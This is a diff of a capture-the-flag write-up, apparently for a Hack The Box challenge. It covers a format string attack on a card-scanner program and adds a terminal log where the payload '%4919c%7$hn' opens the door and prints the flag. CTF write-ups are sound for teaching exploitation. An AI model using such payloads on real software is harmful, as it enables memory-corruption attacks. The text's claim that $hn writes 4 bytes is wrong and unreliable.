@@ -70,7 +70,10 @@ Your card is: 0x7ffdfc86f2d0 0x7f734ef768c0 (nil) 0xf (nil) 0xdeadbeef 0x7ffdfc8
 ```                                                                                                          
                                                 
 
+
 By inputting a couple of %p we can see that the address 0xdeadbeef is at offset 6 and input data is put into offset 7. Anything after becomes arbitrary.
+
+
 
 
 ```$rax   : 0x0               
@@ -148,14 +151,24 @@ So now that we know where we need to point the format string attack we can set u
 
 Command = `%4919c%7$hn`	
 	- 1337=4919(last 4 of dead1337 from hex) 
-  - c= prints character
-  - %7=the offset we are placing the $hn 
-  - $hn=writes 4 bytes to the target pointer.
+  	- c= prints character
+  	- %7=the offset we are placing the $hn 
+  	- $hn=writes 4 bytes to the target pointer.
 
 
 
-
-
+```
+1. Scan card 💳                                                                                                                                    
+2. Insert password ↪                                                                                                                               
+> 1                                                                                                                                                
+                                                                                                                                                   
+[!] Scanning card.. Something is wrong!                                                                                                            
+                                                                                                                                                   
+Insert card's serial number: %4919c%7$hn                                                                                                           
+                                                                                                                                                   
+Your card is:                                                                                                                                                                                 
+[+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}     
+```
 
 With that we have our flag!
 
